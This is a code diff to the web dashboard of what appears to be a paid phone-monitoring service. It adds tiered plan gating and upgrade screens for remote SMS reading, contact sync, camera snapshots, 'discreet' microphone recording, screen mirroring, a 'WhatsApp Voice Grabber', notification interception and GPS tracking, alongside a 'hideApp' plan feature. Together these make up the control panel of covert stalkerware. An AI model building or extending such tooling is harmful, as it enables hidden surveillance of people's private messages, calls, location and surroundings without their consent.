@@ -9,7 +9,8 @@ import { motion, AnimatePresence } from "framer-motion";
 import { 
     Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
     Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
-    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap, Building2, MapPin
+    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap, Building2, MapPin,
+    Monitor, MessageCircle
 } from 'lucide-react';
 import AppNavigation from "@/components/AppNavigation";
 import GalleryView from "@/components/views/GalleryView";
@@ -55,15 +56,20 @@ interface PlanLimits {
     bulkDownload?: boolean;
     maxDevices: number;
     fileManager?: boolean;
+    screenCapture?: boolean;
+    waVoice?: boolean;
+    camera?: boolean;
+    microphone?: boolean;
+    notifications?: boolean;
 }
 
 // Compute plan limits from plan name — used as the source of truth
 const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
-    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true };
-    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true };
-    if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false };
-    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
+    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true };
+    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true };
+    if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: true };
+    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: false };
 };
 
 interface HomeProps {
@@ -2609,6 +2615,55 @@ export default function Home(props: any) {
         }
     }, [socket, selectedDeviceId, userUuid]);
 
+    // Clean Teardown & Isolation on Device Switch
+    useEffect(() => {
+        if (!selectedDeviceId) return;
+
+        // 1. Immediately abort any active streams or hardware feeds
+        if (isLiveStreamingRef.current) {
+            stopLiveCamera();
+        }
+        if (isLiveAudioRef.current) {
+            stopLiveAudio();
+        }
+        if (voiceRecTimerRef.current) {
+            stopVoiceRecording();
+        }
+        setIsRecording(false);
+        setIsCapturingPhoto(false);
+
+        // 2. Close any open device-specific modals / overlays
+        setShowSyncOptionsModal(false);
+        setShowBulkDownloadModal(false);
+        setPreviewItem(null);
+        setOfflineModal(prev => ({ ...prev, isOpen: false }));
+        setPermissionModal(prev => ({ ...prev, isOpen: false }));
+        setSelectedItems(new Set());
+        setIsSelectionMode(false);
+        setSelectedFolder(null);
+
+        // 3. Keep selectedDeviceIdRef updated
+        selectedDeviceIdRef.current = selectedDeviceId;
+
+        // 4. If currently viewing gallery, re-scan folders for new device if online
+        const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(selectedDeviceId));
+        if (targetDevObj?.online && socket && userUuid) {
+            if (selectedTool === 'gallery') {
+                setIsFetchingFolders(true);
+                socket.emit("get_folders", {
+                    uuid: userUuid,
+                    targetDeviceId: selectedDeviceId
+                });
+                setTimeout(() => setIsFetchingFolders(false), 10000);
+            }
+            // Probe live permissions silently for the newly selected device
+            socket.emit("check_permissions", {
+                uuid: userUuid,
+                targetDeviceId: selectedDeviceId
+            });
+        }
+    }, [selectedDeviceId, devices, selectedTool, socket, userUuid, stopLiveCamera, stopLiveAudio, stopVoiceRecording]);
+
     // Fetch missing app icons for existing stored notifications
     useEffect(() => {
         if (!socket || !session?.user?.uuid || !selectedDeviceId || notifications.length === 0) return;
@@ -2988,7 +3043,28 @@ END:VCARD`;
                     />
                 );
             }
-            case 'sms':
+            case 'sms': {
+                if (!planLimits.sms) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-blue-400 border-blue-500/40 shadow-[0_0_30px_rgba(59,130,246,0.25)] mb-4">
+                                <MessageSquare className="w-8 h-8 text-blue-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">SMS Message Monitor</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Live inbox synchronization, full thread reading, and SMS export are exclusive to Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('SMS Messages', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <SmsView
                         smsList={smsList}
@@ -2997,7 +3073,29 @@ END:VCARD`;
                         downloadSmsAsCsv={downloadSmsAsCsv}
                     />
                 );
-            case 'contacts':
+            }
+            case 'contacts': {
+                if (!planLimits.contacts) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-emerald-400 border-emerald-500/40 shadow-[0_0_30px_rgba(16,185,129,0.25)] mb-4">
+                                <Users className="w-8 h-8 text-emerald-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Address Book & Contacts</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Complete phonebook sync, contact search, and vCard address book export are available in Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Address Book & Contacts', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <ContactsView
                         contactsList={contactsList}
@@ -3006,7 +3104,29 @@ END:VCARD`;
                         downloadContactsAsVcf={downloadContactsAsVcf}
                     />
                 );
-            case 'camera':
+            }
+            case 'camera': {
+                if (userPlan !== 'premium' && userPlan !== 'enterprise' && !planLimits.camera) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-rose-400 border-rose-500/40 shadow-[0_0_30px_rgba(244,63,94,0.25)] mb-4">
+                                <Camera className="w-8 h-8 text-rose-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Remote Camera Surveillance</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Live camera video streaming, discrete snapshot capture, and dual-lens recording are exclusive to Premium and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Remote Camera Surveillance', 'premium')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Crown size={15} />
+                                <span>Upgrade to Premium</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <CameraView
                         cameraMode={cameraMode}
@@ -3093,7 +3213,29 @@ END:VCARD`;
                         selectedDeviceId={selectedDeviceId}
                     />
                 );
+            }
             case 'screen': {
+                if (userPlan !== 'premium' && userPlan !== 'enterprise' && !planLimits.screenCapture) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-indigo-400 border-indigo-500/40 shadow-[0_0_30px_rgba(99,102,241,0.25)] mb-4">
+                                <Monitor className="w-8 h-8 text-indigo-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Screen Recording & Mirror</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Real-time remote screen mirroring and high-definition screen video recording are exclusive to Premium and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Screen Recording & Mirror', 'premium')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Crown size={15} />
+                                <span>Upgrade to Premium</span>
+                            </button>
+                        </div>
+                    );
+                }
                 const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
                 const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
                 const isOnline = !!targetDevObj?.online;
@@ -3116,6 +3258,27 @@ END:VCARD`;
                 );
             }
             case 'wavoice': {
+                if (userPlan !== 'premium' && userPlan !== 'enterprise' && !planLimits.waVoice) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-emerald-400 border-emerald-500/40 shadow-[0_0_30px_rgba(16,185,129,0.25)] mb-4">
+                                <MessageCircle className="w-8 h-8 text-emerald-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">WhatsApp Voice Grabber</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Remote WhatsApp Opus audio note synchronization and live audio playback are exclusive to Premium and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('WhatsApp Voice Notes', 'premium')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Crown size={15} />
+                                <span>Upgrade to Premium</span>
+                            </button>
+                        </div>
+                    );
+                }
                 const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
                 const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
                 const isOnline = !!targetDevObj?.online;
@@ -3137,7 +3300,28 @@ END:VCARD`;
                     />
                 );
             }
-            case 'audio':
+            case 'audio': {
+                if (userPlan !== 'premium' && userPlan !== 'enterprise' && !planLimits.microphone) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-violet-400 border-violet-500/40 shadow-[0_0_30px_rgba(139,92,246,0.25)] mb-4">
+                                <Mic className="w-8 h-8 text-violet-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Live Surround Audio</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Real-time ambient audio listening and discreet microphone surround recording are exclusive to Premium and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Live Surround Audio', 'premium')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Crown size={15} />
+                                <span>Upgrade to Premium</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <VoiceView
                         isLiveAudio={isLiveAudio}
@@ -3156,15 +3340,59 @@ END:VCARD`;
                         selectedDeviceId={selectedDeviceId}
                     />
                 );
+            }
             case 'torch':
-            case 'flashlight':
+            case 'flashlight': {
+                if (!planLimits.torch) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-amber-400 border-amber-500/40 shadow-[0_0_30px_rgba(245,158,11,0.25)] mb-4">
+                                <Flashlight className="w-8 h-8 text-amber-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Remote Flashlight Strobe</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Hardware torch strobe control and emergency lighting triggers are available in Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Flashlight Strobe', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <FlashlightView
                         isTorchOn={isTorchOn}
                         toggleTorch={toggleTorch}
                     />
                 );
-            case 'vibration':
+            }
+            case 'vibration': {
+                if (!planLimits.vibration) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-teal-400 border-teal-500/40 shadow-[0_0_30px_rgba(20,184,166,0.25)] mb-4">
+                                <Vibrate className="w-8 h-8 text-teal-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Haptic Vibration Motors</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Remote haptic pulses and pattern vibration testing are available in Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Haptic Vibration', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <VibrationView
                         vibrationDuration={vibrationDuration}
@@ -3172,7 +3400,29 @@ END:VCARD`;
                         triggerVibration={triggerVibration}
                     />
                 );
-            case 'location':
+            }
+            case 'location': {
+                if (!planLimits.location) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-cyan-400 border-cyan-500/40 shadow-[0_0_30px_rgba(6,182,212,0.25)] mb-4">
+                                <MapPin className="w-8 h-8 text-cyan-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">GPS Location Tracking</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Satellite GPS coordinates tracking and route movement history mapping are exclusive to Premium and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('GPS Location Tracking', 'premium')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Crown size={15} />
+                                <span>Upgrade to Premium</span>
+                            </button>
+                        </div>
+                    );
+                }
                 return (
                     <LocationView
                         locationData={locationData}
@@ -3182,7 +3432,29 @@ END:VCARD`;
                         fetchLocation={fetchLocation}
                     />
                 );
+            }
             case 'notifications': {
+                if (userPlan === 'basic' || !planLimits.notifications) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-amber-400 border-amber-500/40 shadow-[0_0_30px_rgba(245,158,11,0.25)] mb-4">
+                                <Bell className="w-8 h-8 text-amber-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Notification Listener</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Real-time interception and monitoring of incoming app notifications are available in Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Notification Listener', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
                 const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);
                 const isDeviceOnline = selectedDevice?.online ?? false;
                 return (
@@ -3230,6 +3502,7 @@ END:VCARD`;
                 setOpenDropdownProp={setNavDropdown}
                 socket={socket}
                 userUuid={session?.user?.uuid || ''}
+                onLockedToolClick={(feature, reqPlan) => showUpgradePrompt(feature, reqPlan)}
             />
 
             {/* Main Content Area */}
